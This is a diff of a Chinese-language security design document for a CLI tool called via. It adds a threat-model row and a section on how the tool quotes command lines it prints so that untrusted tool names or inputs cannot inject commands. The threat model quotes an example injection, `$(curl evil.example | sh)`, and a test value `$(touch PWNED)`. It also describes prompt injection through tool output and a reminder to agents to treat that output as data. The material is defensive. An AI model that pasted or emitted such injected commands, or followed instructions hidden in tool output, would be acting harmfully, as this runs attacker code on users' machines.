@@ -13,12 +13,22 @@ via 与 agent 以同一用户、在同一个 shell 环境中运行，因此**只
 | 其他本地用户访问 daemon | socket 权限 0600、目录 0700，CLI 连接前检查属主与权限位，握手需要 0600 令牌文件里的随机令牌（Node 取不到 `SO_PEERCRED`，用这三项代替对端 uid 校验，见 [daemon.md](daemon.md#socket-安全)）。Windows：管道名由每次启动的令牌派生，令牌文件在用户目录里（见 [daemon.md](daemon.md#windows)） |
 | Windows 上经 `cmd.exe` 的命令注入（参数里的 `&`、`\|`、`%VAR%`） | 命令名只从 `PATH` 解析、不找当前目录；`.cmd` / `.bat` 的每个词放进双引号，含 `"`、`%`、换行的参数拒绝而不转义；打开浏览器不经 `cmd.exe`（见下） |
 | 工具返回内容里夹带指令（提示注入） | via 只做格式化，不解释内容；元信息使用固定的 `·` 前缀行，避免与工具内容混淆；`via prompt` 生成的说明提醒 agent 把工具输出当作数据 |
+| 粘贴 via 打印的命令行时执行了别的命令（工具名、prompt 名、参数名、枚举值、URI、用户输入里的 `$(…)`、反引号、`\`、`!`、引号、换行） | 打印出来的命令行里，不是 via 自己写的词一律经同一组引用函数（`src/render/shell.ts`）：POSIX 用单引号，Windows 用 PowerShell 与 `cmd.exe` 都认的双引号，必要时用 PowerShell 的单引号（且词里没有 `cmd.exe` 的语法字符）；没有安全写法的词（含换行与控制字符、花引号等）不进入命令行，换成 `<占位符>`；以 `-` 开头的外部值不作位置参数（会被当成 via 的选项）；回显在消息里的文字，换行与控制字符写成可见的转义。规则与不覆盖的情形（csh）见 [output.md](output.md#可粘贴的命令行) |
 | 缓存中的敏感结果 | 游标与媒体文件存放在权限为 0700 的用户缓存目录，按 TTL 清理。Windows 没有这类权限位，私密性来自用户目录的默认 ACL（见下「Windows 上的文件权限」）。性能缓存（`tools/list` 的原始缓存与预构建缓存、配置的解析缓存）同在这个目录：配置解析缓存只存结构和字符串在文件里的偏移，不复制任何字符串，所以写进配置的字面量凭证不会出现在缓存目录里（[config.md](config.md#解析缓存)）；预构建缓存只含工具名、参数名、描述与检索词，和原始缓存同一类内容，不含任何凭证值（[discovery.md](discovery.md#预构建缓存)） ||
 | 读取其他客户端的 token | 不读取；OAuth 由 via 自己完成并存入钥匙串（不可用时退回 0600 的私有文件，[auth.md](auth.md#存储)） |
 | OAuth token 出现在输出里 | access token、refresh token、ID token 与客户端 secret 一律计入脱敏列表；授权 URL 只含 `state` 与 PKCE challenge，不含秘密；回调监听只绑 `127.0.0.1` 并校验 `Host` 与 `state`；调用过程永远不会启动授权 |
 | 授权被发往仓库指定的地址 | `via auth login` 对未信任的项目级 server 退出码 5 |
 | 本机目录被告知 server（roots） | 默认不声明 `roots` 能力，server 看不到任何本机目录；只有用户在配置里写下 `roots` 才声明。项目级配置设置非空 `roots` 需要 `via trust`，`via trust` 会列出；`[]` 只会收窄，不需要。给 HTTP server 配 `roots` 时告警（本地路径发往远端）。via 不会因为 server 的请求改变 roots，会话的 roots 在其生命周期内固定 |
 | 工具描述与查询被发往第三方 embedding 端点 | `search.semantic` 默认关闭，只在用户配置里生效（项目与框架配置里的被忽略并告警）；见下文[embedding 检索的数据外流](#embedding-检索的数据外流) |
+
+## 打印出来的命令行
+
+via 打印的 `next:` 提示、`-h` 的用法与示例、`via trust` 的命令行显示，都含有来自不可信一方的文字：server 的工具描述与名字、参数 schema 里的枚举值与默认值，以及用户（常常是被提示注入的 agent）输入的名字和路径。它们不能成为一条会执行的命令：
+
+- 威胁模型：server 或一段提示注入，让 via 在输出里写出 `via github $(curl evil.example | sh)` 之类的建议，由下一步照抄的 agent 或人粘贴执行。via 不解释内容，但它自己拼的命令行是它的责任。
+- 防线是单点引用（[output.md](output.md#可粘贴的命令行)）：所有外部文字经 `shellQuote`/`shellArg`/`shellWords`，不能安全引用的写成占位符而不是勉强引用，回显在消息里的文字转义换行与控制字符。工具名、资源名、动作名在拆分时已被规范成小写的字母、数字与 `-`（naming.md），所以通常本身就是安全的词；这层引用是纵深防御，也覆盖原始名（`alias:` 行）、prompt 名、归一化后同名而保留的原参数名、用户输入与路径。
+- 测试：`test/render/shell.test.ts` 用真实的 `sh`/`bash`/`dash`（有则 `zsh`）粘贴引用结果，核对读回的参数与「没有任何命令被执行」；`test/cli/quoting.test.ts` 用名为 `$(touch PWNED)`、带反引号、引号、换行的工具、参数与 prompt 走完整个命令行。
+- 不保证：csh、tcsh；终端对粘贴内容的预处理；从一个平台复制到另一个平台。via 只按它运行的平台引用。
 
 ## 项目级配置的信任
 
@@ -28,7 +38,7 @@ via 与 agent 以同一用户、在同一个 shell 环境中运行，因此**只
 - 信任按「文件路径（符号链接解析后的真实路径）+ 内容的 SHA-256」记录在用户数据目录的 `trust.json`（目录 0700，文件 0600，原子替换）；内容变化后需要重新确认。哈希针对 via 实际解析的那份字节，读取与校验之间文件被改动不会被误信任。记录文件损坏时视为没有任何信任记录，并给出告警。Windows 上路径先规范成唯一写法再记录和比较：用 `realpath.native` 取真实路径（还原大小写、展开 8.3 短名、联接点与 `subst` 盘符），去掉 `\\?\` 与 `\\?\UNC\` 前缀，盘符大写；比较时不区分大小写（NTFS 默认不区分），所以 `c:\repo\.via.yaml`、`C:/Repo/.via.yaml` 和 `\\?\C:\REPO\.via.yaml` 是同一个文件、同一条记录。
 - 项目级文件设置非空的 `roots` 同样视为决定 server 能碰什么的字段：它会把本机目录交给 server（filesystem 类 server 会把 roots 当作可访问范围），所以与 `command`、`url` 一样需要 `via trust`；用户级配置里定义的 server，如果项目配置给它加了 `roots`，视为未信任。写成 `[]` 只会收窄，不需要。
 - 凡是参与决定传输的项目级文件都要已被信任：stdio 进程如何启动（`command`、`args`、`env`、`cwd`），HTTP 请求发往哪里、带什么头（`url`、`headers`）。用户级配置里定义的 server，如果项目配置给它加了 `env`、改了 `url` 或加了 `headers`，同样视为未信任；项目配置只改 `timeout`、`disabled`、`auth` 等不影响传输的字段则不需要。项目配置里 `sources` 列出的文件按项目级处理。
-- 未信任时，这些 server 在视图中显示为 `untrusted`，调用退出码 5，并提示 `via trust <路径>`（同一个 server 有多个文件待确认时提示不带路径的 `via trust`）。路径含空格等字符时按 shell 规则加引号。
+- 未信任时，这些 server 在视图中显示为 `untrusted`，调用退出码 5，并提示 `via trust <路径>`（同一个 server 有多个文件待确认时提示不带路径的 `via trust`）。路径含空格等字符时按 shell 规则加引号，没有安全写法的路径写成 `<path>`（[output.md](output.md#可粘贴的命令行)）。
 - 项目级配置和框架配置中出现 `cmd:` 凭证引用时直接拒绝，信任也不能放行：该 server 的定义整条被忽略，并报 error 级诊断（`cmd-forbidden`）。`cmd:` 会执行命令，不属于「确认之后可以使用」的范畴；需要时在用户配置里定义，项目配置只能引用用户配置里已有的 server（改传输部分仍要信任）。
 - `deny` 不受信任机制约束：项目配置只能追加规则，不能撤销用户配置的规则，详见 [config.md](config.md#deny)。
 
@@ -42,7 +52,7 @@ via trust --revoke <路径>        # 删除一条记录
 ```
 
 - **范围**：不带路径时，处理当前目录加载到的、因信任而被拦住的项目级文件（含 `.via.yaml`、`sources` 列出的项目级文件、项目级框架配置）；带路径时只处理这一个文件。路径必须是当前目录实际加载的项目级文件（相对路径相对于当前目录，符号链接按真实路径匹配），否则退出码 2；该文件里没有需要信任的 server 定义时只说明情况，不记录。信任是针对文件的，不是针对 server 的。
-- **显示内容**：每个文件一段，写明文件路径、状态（`not trusted`；曾信任过但内容变了则为 `changed since it was trusted`）、哈希前 12 位，以及受它影响的每个 server 的有效传输定义：stdio 的命令行（含参数，含空白的参数加引号）、`cwd`、`env` 的变量名；HTTP 的 scheme、主机与路径（userinfo、查询串隐藏，并注明），`headers` 的头名；非空的 `roots` 照原样列出（`roots: ., ~/notes`）。`env`、`headers`、`auth` 的值只写来源：凭证引用写引用本身，字面量写 `(literal)`，不显示值；`cmd:` 只写程序名，因为参数里可能带密钥。文件内容里的控制字符、双向文本控制符按转义形式显示，避免文件伪造显示内容。命令行的参数是配置原文，会原样显示，**不要把密钥写进参数**。
+- **显示内容**：每个文件一段，写明文件路径、状态（`not trusted`；曾信任过但内容变了则为 `changed since it was trusted`）、哈希前 12 位，以及受它影响的每个 server 的有效传输定义：stdio 的命令行（含参数，按[可粘贴的命令行](output.md#可粘贴的命令行)的规则引用，含空白的参数加引号；含控制字符等没有安全写法的参数显示为转义字符串）、`cwd`、`env` 的变量名；HTTP 的 scheme、主机与路径（userinfo、查询串隐藏，并注明），`headers` 的头名；非空的 `roots` 照原样列出（`roots: ., ~/notes`）。`env`、`headers`、`auth` 的值只写来源：凭证引用写引用本身，字面量写 `(literal)`，不显示值；`cmd:` 只写程序名，因为参数里可能带密钥。文件内容里的控制字符、双向文本控制符按转义形式显示，避免文件伪造显示内容。命令行的参数是配置原文，会原样显示，**不要把密钥写进参数**。
 - **确认**：显示之后需要明确确认才记录。默认的确认方式是终端交互：stdin 与 stderr 都是 TTY 时提示 `trust this file? [y/N]`，只有 `y`/`yes` 通过；回答 `n` 或直接回车退出码 5，什么都不记录。没有终端时退出码 5，`next:` 是 `ask the user to run this in a terminal: via trust <路径>`（提示不建议 `--yes`）。`--dry-run` 只显示、不记录，退出码 0。
 - **`--yes`（给脚本用）**：不是一个单独的开关，必须同时满足两个条件，否则什么都不记录：
   1. 带显式路径，不带路径时退出码 2（`--yes needs an explicit <path>`）：脚本必须写明要信任哪个文件，不能「把当前目录里拦住的都放行」；
